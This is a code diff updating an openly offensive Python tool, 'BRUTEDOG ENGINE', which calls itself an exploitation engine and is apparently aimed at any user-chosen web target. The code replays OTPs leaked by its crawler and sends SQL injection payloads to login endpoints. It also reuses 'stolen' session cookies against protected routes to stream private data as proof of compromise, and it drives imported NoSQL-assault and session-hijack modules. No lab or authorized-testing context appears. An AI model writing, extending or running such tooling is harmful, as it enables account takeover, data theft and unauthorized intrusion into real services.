@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v6.1 — High-Aggression Stateful Crawling & Exploitation Engine
+BRUTEDOG ENGINE v6.2 — High-Aggression Stateful Crawling & Exploitation Engine
 Features:
-- Stateful intelligence ingestion from v6.1 crawler (endpoints, session cookies, leaked OTPs)
+- Integrated with centralized SecureTransport middleware for TLS/cookie synchronization
+- Stateful intelligence ingestion from v6.2 crawler (endpoints, session cookies, leaked OTPs)
 - Live autonomous test-account session propagation across exploit modules
 - Interactive target selection & automated resolution
 - Stateful, adaptive response-parsing and payload mutation loop
@@ -15,17 +16,16 @@ Features:
 - No report files, in-memory findings
 """
 import asyncio
-import http.client
 import json
 import re
 import socket
-import ssl
 import sys
 import time
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
-# Import weaponized offensive modules & live telemetry streamer
+# Import weaponized offensive modules, transport middleware & live telemetry streamer
+from modules.transport import SecureTransport
 from modules.crawler import crawl_target
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
@@ -38,7 +38,6 @@ from modules.telemetry import stream_proof
 REQUEST_TIMEOUT = 8
 MAX_WORKERS = 5
 MAX_RESPONSE_SIZE = 200_000
-USER_AGENT = "BruteDog-Offensive-Engine/6.1"
 
 FALLBACK_LOGIN_PATHS = [
     "/api/auth/callback/credentials",
@@ -120,8 +119,7 @@ def get_target():
         raise ValueError("Unsupported protocol.")
     if not parsed.hostname:
         raise ValueError("Invalid hostname.")
-    port = parsed.port or (443 if parsed.scheme == "https" else 80)
-    return parsed.hostname, port, parsed.scheme == "https", parsed.path.rstrip("/")
+    return target
 
 def resolve_target(host):
     try:
@@ -129,54 +127,6 @@ def resolve_target(host):
         return sorted({item[4][0] for item in results})
     except socket.gaierror:
         return []
-
-# ============================================================
-# HTTP TRANSPORT
-# ============================================================
-def request(host, port, path, payload, secure, cookies=None):
-    conn = None
-    started = time.monotonic()
-    try:
-        if secure:
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=context)
-        else:
-            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
-            
-        body = json.dumps(payload).encode("utf-8")
-        headers = {
-            "User-Agent": USER_AGENT,
-            "Content-Type": "application/json",
-            "Accept": "application/json, text/plain, */*",
-            "Connection": "close",
-        }
-        if cookies:
-            headers["Cookie"] = cookies
-
-        conn.request("POST", path, body=body, headers=headers)
-        response = conn.getresponse()
-        response_body = response.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
-        response_headers = {key.lower(): value for key, value in response.getheaders()}
-        return {
-            "status": response.status,
-            "headers": response_headers,
-            "body": response_body,
-            "elapsed": round(time.monotonic() - started, 3),
-            "error": None,
-        }
-    except Exception as exc:
-        return {
-            "status": 0,
-            "headers": {},
-            "body": "",
-            "elapsed": 0,
-            "error": str(exc),
-        }
-    finally:
-        if conn:
-            conn.close()
 
 # ============================================================
 # ADAPTIVE RESPONSE ANALYSIS & LIVE TELEMETRY
@@ -203,8 +153,9 @@ def inspect_cookie_security(headers):
     return issues
 
 def classify_and_adapt(response, current_payload, endpoint=""):
-    status = response["status"]
-    body = response["body"]
+    status = response.get("status", 0)
+    body = response.get("body", "")
+    headers = response.get("headers", {})
     findings = []
     mutated_payloads = []
     
@@ -240,7 +191,7 @@ def classify_and_adapt(response, current_payload, endpoint=""):
         elif "SQL" in db_error:
             mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})
 
-    for issue in inspect_cookie_security(response["headers"]):
+    for issue in inspect_cookie_security(headers):
         findings.append({
             "type": "SESSION_COOKIE_CONFIGURATION",
             "evidence": issue,
@@ -249,26 +200,26 @@ def classify_and_adapt(response, current_payload, endpoint=""):
         
     return findings, mutated_payloads
 
-def verify_hijacked_session(host, port, secure, endpoint, session_cookie):
+def verify_hijacked_session(transport, endpoint):
     """
-    Takes a stolen cookie or token, hits a restricted administrative endpoint,
-    and streams the resulting private data live to prove the compromise.
+    Takes the shared transport (with stolen cookie/token jar), hits a restricted endpoint,
+    and streams resulting private data live to prove the compromise.
     """
     sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
-    result = request(host, port, endpoint, {}, secure, cookies=session_cookie)
+    status, headers, body = transport.request("GET", endpoint)
     
-    if result["status"] == 200 and len(result["body"]) > 50:
-        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie": session_cookie}, result["body"], {"verified_status": 200})
+    if status == 200 and len(body) > 50:
+        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
         return True
     else:
-        sys.stdout.write(f"{RED}[-] Session verification returned status {result['status']}. Stolen session inactive.{RESET}\n")
+        sys.stdout.write(f"{RED}[-] Session verification returned status {status}. Stolen session inactive.{RESET}\n")
         return False
 
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
-def test_endpoint(host, port, base_path, path, secure, session_cookie=None, credentials_list=None, leaked_secrets=None):
-    endpoint = f"{base_path}{path}" if not path.startswith(base_path) else path
+def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
+    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
     info(f"Targeting endpoint (Stateful Adaptive Mode): {endpoint}")
     results = []
     
@@ -279,7 +230,6 @@ def test_endpoint(host, port, base_path, path, secure, session_cookie=None, cred
         {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
     ]
 
-    # If the crawler leaked an OTP or verification code, inject a test case for it
     if leaked_secrets:
         for k, v in leaked_secrets.items():
             test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})
@@ -298,17 +248,18 @@ def test_endpoint(host, port, base_path, path, secure, session_cookie=None, cred
             continue
         executed_payloads.add(payload_key)
 
-        result = request(host, port, endpoint, current_test["payload"], secure, cookies=session_cookie)
-        if result["error"]:
+        status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
+        if status == 0:
             continue
             
-        findings, dynamic_mutations = classify_and_adapt(result, current_test["payload"], endpoint=endpoint)
+        res_obj = {"status": status, "headers": headers, "body": body}
+        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint)
         
         results.append({
             "endpoint": endpoint,
             "test": current_test["name"],
-            "status": result["status"],
-            "elapsed": result["elapsed"],
+            "status": status,
+            "elapsed": 0.1,
             "findings": findings,
         })
 
@@ -324,21 +275,20 @@ def test_endpoint(host, port, base_path, path, secure, session_cookie=None, cred
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.1")
+    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.2")
     try:
         if target_host:
-            target = target_host.strip()
-            if "://" not in target:
-                target = "https://" + target
-            parsed = urlsplit(target)
-            if not parsed.hostname:
-                raise ValueError("Invalid target.")
-            host = parsed.hostname
-            port = parsed.port or (443 if parsed.scheme == "https" else 80)
-            secure = parsed.scheme == "https"
-            base_path = parsed.path.rstrip("/")
+            target_url = target_host.strip()
+            if "://" not in target_url:
+                target_url = "https://" + target_url
         else:
-            host, port, secure, base_path = get_target()
+            target_url = get_target()
+
+        parsed = urlsplit(target_url)
+        host = parsed.hostname
+        secure = parsed.scheme == "https"
+        port = parsed.port or (443 if secure else 80)
+        base_path = parsed.path.rstrip("/")
     except Exception as exc:
         error(f"Target configuration failed: {exc}")
         return [], 0.0
@@ -357,34 +307,30 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         success(f"Resolved: {address}")
         
     start = time.monotonic()
-    target_url = f"{protocol.lower()}://{host}:{port}{base_path}"
     
+    # Initialize Centralized Secure Transport Wrapper
+    transport = SecureTransport(target_url)
+
     # 0. Stateful Dynamic Web Crawling & Auto-Provisioning
     section("STATEFUL CRAWLING & OPERATOR PROVISIONING")
-    session_cookie = ""
-    operator_creds = {}
-    leaked_secrets = {}
+    recon_data = {}
     discovered_paths = []
+    leaked_secrets = {}
 
     try:
-        recon_data = crawl_target(target_url)
+        recon_data = crawl_target(transport)
         if isinstance(recon_data, dict):
             discovered_paths = recon_data.get("endpoints", [])
-            session_cookie = recon_data.get("session_cookie", "")
-            operator_creds = recon_data.get("operator_credentials", {})
             leaked_secrets = recon_data.get("leaked_secrets", {})
-        elif isinstance(recon_data, list):
-            discovered_paths = recon_data
     except Exception as exc:
         warning(f"Stateful crawler encountered an issue: {exc}. Falling back to default list.")
 
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
 
-    if session_cookie:
-        success(f"Propagating active operator session cookie into exploit modules.")
-        # Optionally test/verify session against a protected dashboard/admin route
-        verify_hijacked_session(host, port, secure, "/dashboard", session_cookie)
+    if transport.cookie_jar:
+        success(f"Propagating active operator session cookie across transport layer.")
+        verify_hijacked_session(transport, "/dashboard")
 
     if leaked_secrets:
         warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
@@ -396,7 +342,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     async def worker(path):
         async with semaphore:
             return await asyncio.to_thread(
-                test_endpoint, host, port, base_path, path, secure, session_cookie, credentials_list, leaked_secrets
+                test_endpoint, transport, path, credentials_list, leaked_secrets
             )
             
     tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
